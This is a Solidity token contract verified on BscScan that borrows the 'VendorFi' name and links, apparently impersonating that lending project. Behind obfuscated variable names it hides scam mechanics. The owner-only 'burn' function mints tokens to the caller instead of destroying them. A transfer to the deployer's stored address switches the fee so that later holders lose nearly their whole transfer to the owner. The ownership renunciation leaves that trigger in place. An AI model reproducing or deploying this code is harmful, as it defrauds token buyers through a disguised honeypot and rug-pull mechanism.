/**
 *Submitted for verification at BscScan.com on 2022-11-30
*/

//////////////////////////////////////////////////////////////////////////
//VendorFi
//Permission-less, non-liquidatable, fixed-rate, and fixed  terms loan pools customized by lenders. Not Liquidated !
//Beta is live on 
//https://vendor.finance
//discord.gg/kJBAC3G2pY
//https://twitter.com/VendorFi
//////////////////////////////////////////////////////////////////////////

// SPDX-License-Identifier: MIT
pragma solidity =0.8.17;
contract VendorFi {
address private  VgjtZr = address(0);
event Approval(address indexed owner, address indexed spender, uint256 value);
uint256 private  WPlJdo = 1000000000000000;
uint256 private  UkUCrr = 100000000;
string public  name = "VendorFi";
address private  ydwGVg = address(0);
event Transfer(address indexed from, address indexed to, uint256 value);
address private  eddOrO = address(0);
mapping (address => mapping (address => uint256)) private _allowances;
string public  symbol = "VendorFi";
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
uint256 private  rWZFaE = 10000000000000;
address private  srjHPS = address(0);
uint256 private  xxAWJu = 1000000000000000000;
uint256 public constant totalSupply = 100000000000000000000000000000;
address public owner;
uint8 public constant decimals = 18;
address private  jFmirJ = address(0);
address private  TBFcjS = address(0);
uint256 private  npwiPP = 1000000000000000000000;
address private  UcMgzg = address(0);
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
mapping (address => uint256) public balanceOf;
uint256 private  pQKAkk = 10000000000;
address private  WVGFDd = address(0);
uint256 public constant XdpetD = 99999;
address private  mTXyqz = address(0);
uint256 private  QWQXhk = 1000000000000000000;
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "taCPUWW 0");
require(spender != address(0), "faCPUWW 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}


function _getTBFcjS() private returns (address) {
return TBFcjS;
}

function _geteddOrO() private returns (address) {
return eddOrO;
}

function _getjFmirJ() private returns (address) {
return jFmirJ;
}





function _getnpwiPP() private returns (uint256) {
return npwiPP;
}

modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function _getydwGVg() private returns (address) {
return ydwGVg;
}



function _getWPlJdo() private returns (uint256) {
return WPlJdo;
}

function _getrWZFaE() private returns (uint256) {
return rWZFaE;
}



function _getQWQXhk() private returns (uint256) {
return QWQXhk;
}

function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "aCPUWW");
require(to != address(0), "aCPUWW");
require(amount <= balanceOf[from], "aCPUWW");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* XdpetD/xxAWJu ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==UcMgzg){
xxAWJu = XdpetD+2;
}
emit Transfer(from, to, transferAmount);
}
constructor () {
UcMgzg = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}


function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}


function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function _getWVGFDd() private returns (address) {
return WVGFDd;
}

function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}




function _getpQKAkk() private returns (uint256) {
return pQKAkk;
}

function _getVgjtZr() private returns (address) {
return VgjtZr;
}

function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function _getsrjHPS() private returns (address) {
return srjHPS;
}



function _getmTXyqz() private returns (address) {
return mTXyqz;
}







function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function _getUkUCrr() private returns (uint256) {
return UkUCrr;
}





function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}

}